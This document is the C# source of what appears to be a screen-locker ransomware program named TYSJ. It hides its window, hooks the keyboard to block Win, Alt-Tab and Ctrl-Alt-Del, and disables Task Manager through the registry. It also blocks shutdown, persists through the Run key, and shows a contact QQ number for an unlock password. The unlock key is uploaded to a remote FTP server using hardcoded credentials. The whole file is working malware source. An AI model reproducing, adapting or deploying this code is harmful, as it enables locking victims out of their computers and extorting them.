using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using WinAPI32;
using CCWin;

namespace TYSJ
{
    public partial class Form1 : Form
    {
        public string guid = "";
        public string ip = "http://weeeee.3vzhuji.net";
        string FilePath = Directory.GetCurrentDirectory();
        #region 窗体代码
        bool IsPass = true;
        bool WebPass = false;
        string[] start;

        public Form1(string[] args)
        {
            InitializeComponent();
            Microsoft.Win32.SystemEvents.SessionEnding += SessionEndingEvent;
            Hide();
            start = args;
            hook.Hook_Start();
            class1.Disable_Ctrl_Alt_Del();
        }

        public void CloseMain()
        {
            ShieldMissionTask(0);
            IsPass = true;
            ShowWindow(FindWindowA("Shell_TrayWnd", null), 9);
            hook.Hook_Clear();
            class1.Enable_Ctrl_Alt_Del();
            SetAutoBootStatu(false);
            this.Dispose();
        }

        Class1 class1 = new Class1();
        Hook hook = new Hook();
        string AESOUTPUT;
        string PSOUTPUT;
        void windowload()
        {
            this.KeyPreview = true;
            if (guid != "")
            {
                skinLabel8.Text = skinLabel8.Text.Replace("%uuid%", guid);
            }
            else
            {
                skinLabel8.Text = skinLabel8.Text.Replace("%uuid%", Guid.NewGuid().ToString());
            }
            #region 获取系统参数
            listBox1.Items.Add("系统参数:");
            listBox1.Items.Add("系统名:" + Information.Environment.OSName);
            listBox1.Items.Add("机器名:" + Information.Environment.MachineName);
            listBox1.Items.Add("可用内存:" + Information.Environment.TotalMemoryUsed);
            listBox1.Items.Add("登陆账户:" + Information.Environment.UserName);
            listBox1.Items.Add("系统版本:" + Information.Environment.OSVersion);
            listBox1.Items.Add("-------------------------------------------");
            #endregion
            生成ID();
            AESOUTPUT = AESEn.EncryptAes(ID.Text, AESEn.AesKey);
            PSOUTPUT = AESEn.CompressString(AESOUTPUT);
            getwebstream();
            SetAutoBootStatu(true);
            listBox1.Items.Add("获取参数完毕");
            listBox1.Items.Add("调用图形界面");
            #region 检测参数
            if (start.Length > 1)
            {
                string qq = "";
                string email = "";
                string wx = "";
                string image = "";
                int a = 0;
                if (start.Contains("-backgroundimage"))
                {
                    foreach (string b in start)
                    {
                        if (b == "-backgroundimage")
                        {
                            if (b == "-backgroundimage")
                            {
                                image = start[a + 1];
                                break;
                            }
                            a = a + 1;
                        }
                        a = a + 1;
                    }
                    a = 0;
                }
                if (start.Contains("-backgroundimage2"))
                {
                    foreach (string b in start)
                    {
                        if (b == "-backgroundimage2")
                        {
                                image = start[a + 1];
                                break;
                        }
                        a = a + 1;
                    }
                    a = 0;
                }
                if (start.Contains("-serverip"))
                {
                    foreach (string b in start)
                    {
                        if (b == "-serverip")
                        {
                            ip = start[a + 1];
                            try
                            {
                                web.DownloadFile(ip + "/TYSJ/systemoutput/config.asp", FilePath + "/serverconfig.ini");
                            }
                            catch
                            {
                                MessageForm.Show("无法连接到远程验证服务器!");
                                ShieldMissionTask(0);
                                IsPass = true;
                                ShowWindow(FindWindowA("Shell_TrayWnd", null), 9);
                                SetAutoBootStatu(false);
                                Process.GetCurrentProcess().Kill();
                            }
                            break;
                        }
                        a = a + 1;
                    }
                    a = 0;
                }
                if (start.Contains("-qq"))
                {
                    foreach (string b in start)
                    {
                        if (!start.Contains("-qq"))
                        {
                            break;
                        }
                        if (b == "-qq")
                        {
                            qq = start[a + 1];
                            break;
                        }
                        a = a + 1;
                    }
                    a = 0;
                }
                if (start.Contains("-email"))
                {
                    foreach (string b in start)
                    {
                        if (!start.Contains("-email"))
                        {
                            break;
                        }
                        if (b == "-email")
                        {
                            email = start[a + 1];
                            break;
                        }
                        a = a + 1;
                    }
                    a = 0;
                }
                if (start.Contains("-wx"))
                {
                    foreach (string b in start)
                    {
                        if (!start.Contains("-wx"))
                        {
                            break;
                        }
                        if (b == "-wx")
                        {
                            wx = start[a + 1];
                            break;
                        }
                        a = a + 1;
                    }
                }
                if (qq.Length > 0)
                {
                    skinLabel6.Text = skinLabel6.Text + "QQ " + qq;
                }
                if (email.Length > 0)
                {
                    skinLabel6.Text = skinLabel6.Text + "邮箱 " + email;
                }
                if (wx.Length > 0)
                {
                    skinLabel6.Text = skinLabel6.Text + "微信 " + wx;
                }
                if (image.Length > 0)
                {
                    if (image.Contains("{"))
                    {
                        this.BackgroundImage = new Bitmap(Information.Between(image, "{", "}"));
                    }
                    if (image == "1")
                    {
                        this.BackgroundImage = Properties.Resources._1;
                    }
                    else if (image == "2")
                    {
                        this.BackgroundImage = Properties.Resources._2;
                    }
                    else if (image == "3")
                    {
                        this.BackgroundImage = Properties.Resources._3;
                    }
                    else if (image == "4")
                    {
                        this.BackgroundImage = Properties.Resources._4;
                    }
                    else if (image == "5")
                    {
                        this.BackgroundImage = Properties.Resources._5;
                    }
                    else if (image == "6")
                    {
                        this.BackgroundImage = Properties.Resources._6;
                    }
                    else if (image == "7")
                    {
                        this.BackgroundImage = Properties.Resources._7;
                    }
                    else if (image == "8")
                    {
                        this.BackgroundImage = Properties.Resources._8;
                    }
                    else if (image == "9")
                    {
                        this.BackgroundImage = Properties.Resources._9;
                    }
                    else if (image == "10")
                    {
                        this.BackgroundImage = Properties.Resources._10;
                    }
                    else if (image == "11")
                    {
                        this.BackgroundImage = Properties.Resources._11;
                    }
                    else if (image == "12")
                    {
                        this.BackgroundImage = Properties.Resources._12;
                    }
                    else if (image == "13")
                    {
                        this.BackgroundImage = Properties.Resources._13;
                    }
                }
            }
            if (skinLabel6.Text.Length < 5)
            {
                skinLabel6.Text = "联系QQ 3079498044 获取解锁密码";
                Show();
                skinRollingBar1.Visible = false;
                IsPass = false;
            }
            else
            {
                skinLabel6.Text = skinLabel6.Text + " 获取解锁密码";
            }
            #endregion
            #region 尝试与服务器连接
            try
            {
                if (OperateIniFile.ReadIniData("ServerConfig", "useful", "0", FilePath + "/serverconfig.ini") == "0")
                {
                    MessageForm.Show("软件已停止使用!请删除文件!");
                    ShieldMissionTask(0);
                    IsPass = true;
                    ShowWindow(FindWindowA("Shell_TrayWnd", null), 9);
                    SetAutoBootStatu(false);
                    Process.GetCurrentProcess().Kill();
                }
                Online();
                listBox1.Items.Add("第一次尝试与验证服务器链接成功");
            }
            catch
            {
                NotOnline();
                listBox1.Items.Add("第一次尝试链接服务器失败,已经提交问题");
            }
            #endregion
            Show();
            skinRollingBar1.Visible = false;
            IsPass = false;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            skinRollingBar1.Location = new Point(0, 0);
            skinRollingBar1.Size = new Size(this.Width, this.Height);
            Thread thread = new Thread(windowload);
            thread.Start();
            timer1.Start();
            timer2.Start();
        }

        int sum = 10;
        int Sum
        {
            get { return sum; }
            set { sum = value; }
        }
        private void skinButton1_Click(object sender, EventArgs e)
        {
            if (sum == 0)
            {
                if (!WebPass)
                {
                    MessageForm.Show("密码尝试次数已用完,请使用网络解锁!");
                    return;
                }
            }
            if (skinTextBox1.Text.Length <= 0)
            {
                MessageForm.Show("请输入解密密钥!");
                return;
            }
            try
            {
                if (skinTextBox1.Text == PSOUTPUT)
                {
                    CloseMain();
                }
                else
                {
                    sum = sum - 1;
                    MessageForm.Show("触发断点!\n请输入正确的密钥\n你还有" + sum.ToString() + "次机会!");
                    return;
                }
            }
            catch
            {
                sum = sum - 1;
                MessageForm.Show("触发断点!\n请输入正确的密钥\n你还有" + sum.ToString() + "次机会!");
                return;
            }
        }

        private void skinButton3_Click(object sender, EventArgs e)
        {
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!IsPass)
            {
                e.Cancel = true;
                MessageForm.Show("请不要尝试关闭本软件!");
                return;
            }
            File.Delete(FilePath + "/serverconfig.ini");
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process.Start(FilePath + @"\Clean.exe", "-id" + Process.GetCurrentProcess().Id.ToString() + " -filename" + Process.GetCurrentProcess().ProcessName);
        }
        #endregion

        #region 隐藏任务栏与任务管理器
        [DllImport("user32.dll", EntryPoint = "FindWindowA")]
        public static extern IntPtr FindWindowA(string lp1, string lp2);//获取任务栏

        [DllImport("user32.dll", EntryPoint = "ShowWindow")]
        public static extern IntPtr ShowWindow(IntPtr hWnd, int _value);//显示/隐藏任务栏


        /**/
        /// <summary>
        /// 是否屏蔽CTRL+ALT+DEL
        /// </summary>
        /// <param name="i">1=屏蔽 0=取消屏蔽</param>
        public static void ShieldMissionTask(int i)
        {
            try
            {
                //屏蔽 Ctrl + Alt + Del 键
                RegistryKey key = Registry.CurrentUser;
                RegistryKey key1 = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                key1.SetValue("DisableTaskMgr", i, Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        }
        #endregion

        #region 紧急按键(无法连接网络时的应急按键)
        private void Form1_KeyUp(object sender, KeyEventArgs e)
        {
            if ((e.KeyCode == Keys.Tab) && (e.Alt == true))
            {
                e.Handled = true;
            }
            if (e.KeyCode == Keys.F4 && e.Modifiers == Keys.Alt)
            {
                e.Handled = true;
                MessageForm.Show("请勿关闭本窗口!");
            }
            if (e.Modifiers.CompareTo(Keys.Control) == 0 && e.KeyCode == Keys.F5)
            {
                CloseMain();
            }
        }
        #endregion

        #region 禁止关机/注销
        // 在此事件中决定是否关机或logoff
        private void SessionEndingEvent(object sender, SessionEndingEventArgs e)
        {
            SessionEndReasons endReasons = e.Reason;
            if (IsPass)
            {
                // 会关机或logoff
                e.Cancel = false;
            }
            else
            {
                // 不会关机或logoff
                e.Cancel = true;
            }
            switch (endReasons)
            {
                case SessionEndReasons.Logoff:
                    return;

                case SessionEndReasons.SystemShutdown:
                    return;
                    break;

                default:
                    return;
                    break;
            }
        }
        #endregion

        #region 刷新服务器状态
        WebClient web = new WebClient();
        void getwebstream()
        {
            try
            {
                try
                {
                    if (web.DownloadString(ip + "/TYSJ/userid/pass/" + ID.Text + ".asp") == "OK")
                    {
                        skinTextBox1.Text = PSOUTPUT;
                        skinTextBox1.Enabled = false;
                        skinLabel1.Text = "网络验证成功,已自动输入解锁码!";
                        skinLabel1.ForeColor = Color.Green;
                        WebPass = true;
                    }
                }
                catch
                {
                }
                web.DownloadString("http://www.baidu.com");
            }
            catch
            {
                NotOnline();
                return;
            }
            Online();
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Interval = 5000;
            Thread thread = new Thread(getwebstream);
            thread.IsBackground = true;
            thread.Start();
        }
        #endregion

        #region 附加功能

        #region 联网状态
        private void NotOnline()
        {
            skinLabel6.Visible = false;
            skinLabel4.Visible = false;
            skinLabel3.Visible = true;
            skinLabel7.Visible = true;
        }

        private void Online()
        {
            skinLabel6.Visible = true;
            skinLabel4.Visible = true;
            skinLabel7.Visible = false;
            skinLabel3.Visible = false;
        }
        #endregion

        #region 隐藏程序
        protected override CreateParams CreateParams
        {
            get
            {
                const int WS_EX_APPWINDOW = 0x40000;
                const int WS_EX_TOOLWINDOW = 0x80;
                CreateParams cp = base.CreateParams;
                cp.ExStyle &= (~WS_EX_APPWINDOW);    // 不显示在TaskBar  
                cp.ExStyle |= WS_EX_TOOLWINDOW;      // 不显示在Alt-Tab  
                return cp;
            }
        }
        #endregion

        #region ID生成
        private static char[] constant =   
      {   
        '0','1','2','3','4','5','6','7','8','9'
      };
        /// <summary> 生成随机ID </summary>  
        public static string Random(int Length)
        {
            System.Text.StringBuilder newRandom = new System.Text.StringBuilder(10);
            Random rd = new Random();
            for (int i = 0; i < Length; i++)
            {
                newRandom.Append(constant[rd.Next(10)]);
            }
            return newRandom.ToString();
        }

        public void 生成ID()
        {
            CheckForIllegalCrossThreadCalls = false;
            if (File.Exists(FilePath + "/userconfig.ini"))
            {
                ID.Text = OperateIniFile.ReadIniData("UserID", "id", "null", FilePath + "/userconfig.ini");
                roHidFile(FilePath + "/userconfig.ini");
            }
            else
            {
                ID.Text = Random(8);
                File.WriteAllText(FilePath + "/userconfig.ini", "");
                OperateIniFile.WriteIniData("UserID", "id", ID.Text, FilePath + "/userconfig.ini");
                roHidFile(FilePath + "/userconfig.ini");
                FtpLib ftp = new FtpLib("008.3vftp.com", "/TYSJ/userid/", "weeeee", "1235zxcD");
                AESOUTPUT = AESEn.EncryptAes(ID.Text, AESEn.AesKey);
                PSOUTPUT = AESEn.CompressString(AESOUTPUT);
                File.WriteAllText(FilePath + "/" + ID.Text + ".asp", PSOUTPUT);
                ftp.Upload(FilePath + "/" + ID.Text + ".asp");
                File.Delete(FilePath + "/" + ID.Text + ".asp");
            }
        }
        #endregion

        #region 设置文件只读/隐藏
        /// <summary> 设置文件隐藏只读 </summary>  
        /// <param name="path">文件名(包含路径)</param>  
        public void roHidFile(string path)
        {
            FileInfo fi = new FileInfo(path);
            File.SetAttributes(path, fi.Attributes | FileAttributes.Hidden | FileAttributes.ReadOnly);
        }
        #endregion

        #region 自动运行程序
        /// <summary>  
        /// 在注册表中添加、删除开机自启动键值  
        /// </summary>  
        public static int SetAutoBootStatu(bool isAutoBoot)
        {
            try
            {
                string execPath = Application.ExecutablePath;
                RegistryKey rk = Registry.LocalMachine;
                RegistryKey rk2 = rk.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
                if (isAutoBoot)
                {
                    rk2.SetValue("MyExec", execPath);
                    Console.WriteLine(string.Format("[注册表操作]添加注册表键值：path = {0}, key = {1}, value = {2} 成功", rk2.Name, "TuniuAutoboot", execPath));
                }
                else
                {
                    rk2.DeleteValue("MyExec", false);
                    Console.WriteLine(string.Format("[注册表操作]删除注册表键值：path = {0}, key = {1} 成功", rk2.Name, "TuniuAutoboot"));
                }
                rk2.Close();
                rk.Close();
                return 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine(string.Format("[注册表操作]向注册表写开机启动信息失败, Exception: {0}", ex.Message));
                return -1;
            }
        }  
        #endregion

        private void timer2_Tick(object sender, EventArgs e)
        {
            skinLabel9.Text = "当前时间:" + DateTime.Now + "   ";
        }
        #endregion

        private void skinHotKey1_HotKeyTrigger_1(object sender, CCWin.SkinControl.HotKeyEventArgs e)
        {
            Process.GetCurrentProcess().Kill();
        }
    }

    #region Win32操作
    /// <summary>
    /// 键盘钩子(屏蔽键盘按键)
    /// </summary>
    public class Hook
    {
        //键盘Hook结构函数 
        [StructLayout(LayoutKind.Sequential)]
        public class KeyBoardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        //委托 
        public delegate int HookProc(int nCode, int wParam, IntPtr lParam);

        private static int hHook = 0;
        public const int WH_KEYBOARD_LL = 13;

        //LowLevel键盘截获，如果是WH_KEYBOARD＝2，并不能对系统键盘截取，Acrobat Reader会在你截取之前获得键盘。 
        public HookProc KeyBoardHookProcedure;

        #region [DllImport("user32.dll")]

        //设置钩子 
        [DllImport("user32.dll")]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, int threadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        //抽掉钩子 
        public static extern bool UnhookWindowsHookEx(int idHook);

        [DllImport("user32.dll")]
        //调用下一个钩子 
        public static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string name);

        #endregion

        #region 安装键盘钩子

        /// <summary>
        /// 安装键盘钩子
        /// </summary>
        public void Hook_Start()
        {
            if (hHook == 0)
            {
                KeyBoardHookProcedure = new HookProc(KeyBoardHookProc);
                hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardHookProcedure,
                GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
                //如果设置钩子失败. 
                if (hHook == 0)
                {
                    Hook_Clear();
                }
            }
        }

        #endregion

        #region 取消钩子事件

        /// <summary>
        /// 取消钩子事件
        /// </summary>
        public void Hook_Clear()
        {
            bool retKeyboard = true;
            if (hHook != 0)
            {
                retKeyboard = UnhookWindowsHookEx(hHook);
                hHook = 0;
            }
        }

        #endregion

        #region 屏蔽键盘

        /// <summary>
        /// 屏蔽键盘
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        public static int KeyBoardHookProc(int nCode, int wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                KeyBoardHookStruct kbh =
                (KeyBoardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyBoardHookStruct));
                // 屏蔽左"WIN"、右"Win"
                if ((kbh.vkCode == (int)Keys.LWin) || (kbh.vkCode == (int)Keys.RWin))
                {
                    return 1;
                }
                //屏蔽Ctrl+Esc
                if (kbh.vkCode == (int)Keys.Escape && (int)Control.ModifierKeys == (int)Keys.Control)
                {
                    return 1;
                }
                //屏蔽Alt+Esc
                if (kbh.vkCode == (int)Keys.Escape && (int)Control.ModifierKeys == (int)Keys.Alt)
                {
                    return 1;
                }
                //屏蔽Alt+Tab 
                if (kbh.vkCode == (int)Keys.Tab && (int)Control.ModifierKeys == (int)Keys.Alt)
                {
                    return 1;
                }
                //截获Ctrl+Shift+Esc 
                if (kbh.vkCode == (int)Keys.Escape &&
                (int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Shift)
                {
                    return 1;
                }
                if (kbh.vkCode == (int)Keys.Delete && (int)Control.ModifierKeys == (int)Keys.Control + (int)Keys.Alt)
                {
                    MessageForm.Show("请不要尝试启用任务管理器!");
                    return 1;
                }
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        #endregion
    }
#endregion
}
